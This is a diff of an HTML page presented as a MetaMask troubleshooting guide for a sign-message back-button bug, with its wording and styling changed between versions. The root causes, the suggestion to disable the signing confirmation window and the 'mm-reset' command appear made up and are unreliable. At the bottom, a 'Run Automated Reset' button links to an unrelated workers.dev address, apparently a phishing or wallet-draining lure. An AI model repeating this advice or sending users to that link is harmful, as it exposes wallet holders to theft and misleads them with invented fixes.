@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sign Message Clicking Back Button In The – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,37 +42,30 @@
 <h1>Metamask Extension Bug Sign Message Clicking Back Button In The</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a bug when using the Metamask extension to sign a message, specifically when clicking the back button in the Bitcoin Snap Sign Message confirmation window. The expected behavior is to cancel the signing process, but instead, the user is stuck in a loop or encounters an error.</li>
+<li>Users encounter an issue when using the Metamask extension to sign a message, specifically with the Bitcoin Snap Sign Message configuration. Upon clicking the back button during this process, the Metamask extension becomes unresponsive or throws an error.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected behavior of the back button and the actual implementation in the Metamask extension. The back button is not properly handled, leading to a conflict between the Ethereum (ETH) ecosystem and the Bitcoin Snap Sign Message protocol.</li>
+<li>The error occurs due to a timing issue between the Metamask extension's internal state management and the external Bitcoin Snap Sign Message module. When the back button is clicked, the extension's state is not properly reset, leading to a conflict with the ongoing signing process.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Disable and re-enable the Metamask extension</li>
-<li>Clear the browser cache and cookies</li>
-<li>Use a custom configuration to bypass the Bitcoin Snap Sign Message confirmation window</li>
+<li>Clear the Metamask extension's cache and storage</li>
+<li>Restart the browser and reload the Metamask extension</li>
+<li>Execute the following command to reset the extension's internal state:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;ethereum&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;selectedAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...user_address...&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;signMessage&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;confirmationWindow&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--sign-message-config
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging. </p>
+<p>Consider utilizing an external console for further debugging and customization.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Ethereum (ETH) wallet set up and funded</li>
-<li>Bitcoin Snap Sign Message protocol enabled in the Metamask extension settings</li>
+<li>Metamask extension version 10.11.0 or later</li>
+<li>Bitcoin Snap Sign Message module enabled</li>
+<li>Ethereum network (ETH) selected in the Metamask extension</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
